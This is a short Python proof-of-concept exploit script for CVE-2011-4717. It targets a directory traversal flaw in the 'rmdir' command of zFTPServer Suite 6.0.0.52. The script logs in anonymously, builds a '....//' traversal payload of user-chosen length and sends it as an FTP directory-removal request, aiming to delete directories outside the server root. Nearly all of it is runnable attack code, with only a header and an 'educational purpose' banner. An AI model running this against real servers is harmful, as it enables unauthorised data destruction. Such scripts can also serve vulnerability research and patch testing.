#!/usr/bin/python3
#################################################################################
# Advisory:          zFTPServer Suite 6.0.0.52 'rmdir' Directory Traversal
# Author:            Stefan Schurtz - re-write python by SICARIO 
# Contact:           sschurtz@t-online.de
# Affected Software: Successfully tested on zFTPServer Suite 6.0.0.52
# Vendor URL:        http://www.zftpserver.com/
# Vendor Status:     fixed
# CVE-ID:            CVE-2011-4717
# PoC-Version:       0.3
# Usage:             python exploit.py IP 10 
#################################################################################

import sys
import ftplib
from time import sleep

user = "anonymous"
password = "anonymous@"

########################
# connect
########################
try:
    target = sys.argv[1]
    plength = int(sys.argv[2])
except IndexError:
    print("\n")
    print("\t#######################################################\n")
    print("\t# This PoC-Exploit is only for educational purpose!!! #\n")
    print("\t#######################################################\n")
    print("\n")
    print("[+] Usage: {} <target> <payload length>\n".format(sys.argv[0]))
    sys.exit(1)

print("[+] Connecting to {}".format(target))
try:
    ftp = ftplib.FTP(target, timeout=15)
    print("[+] Connected to {}".format(target))
except Exception as e:
    print("Cannot connect to {}: {}".format(target, e))
    sys.exit(1)

########################
# login
########################
print("[+] Logging in with user {}".format(user))
try:
    ftp.login(user, password)
    print("[+] Logged in with user {}".format(user))
except Exception as e:
    print("Cannot login: {}".format(e))
    sys.exit(1)

###################################################
# Building payload '....//' with min. length of 38
##################################################
payload = ""
p = ["", ".", ".", ".", ".", "/", "/"]

print("[+] Building payload")
for i in range(1, plength + 1):
    payload += p[i]
    p.append(p[i])

sleep(3)

#########################################
# Sending payload
#########################################
print("[+] Sending payload {}".format(payload))
try:
    ftp.rmd(payload)
    print("[+] Payload sent successfully")
except Exception as e:
    print("rmdir failed: {}".format(e))

##########################################
# disconnect
##########################################
print("[+] Done")
ftp.quit()
sys.exit(0)
#EOF
